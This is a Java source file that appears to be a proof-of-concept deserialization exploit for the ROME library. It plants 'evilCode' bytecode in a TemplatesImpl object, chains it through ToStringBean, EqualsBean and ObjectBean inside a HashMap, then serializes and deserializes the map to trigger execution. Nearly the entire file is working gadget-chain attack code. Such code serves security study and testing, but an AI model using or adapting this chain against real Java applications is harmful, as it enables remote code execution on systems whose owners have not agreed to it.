package com.summer.rome;

import com.summer.util.SerializeUtil;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;
import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.util.HashMap;

public class RomeUn {
    public static void main(String[] args) throws Exception{
        byte[] evilCode = SerializeUtil.getEvilCode();
        TemplatesImpl templates = new TemplatesImpl();
        SerializeUtil.setFieldValue(templates,"_bytecodes",new byte[][]{evilCode});
        SerializeUtil.setFieldValue(templates,"_name","feng");
        SerializeUtil.setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());

        ToStringBean toStringBean = new ToStringBean(Templates.class, templates);
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);

        ObjectBean objectBean = new ObjectBean(String.class,"feng");


        HashMap evilMap = new HashMap();
        evilMap.put(objectBean,1);
        evilMap.put(objectBean,1);

        SerializeUtil.setFieldValue(objectBean,"_equalsBean",equalsBean);


        byte[] bytes = SerializeUtil.serialize(evilMap);
        SerializeUtil.unserialize(bytes);
    }
}
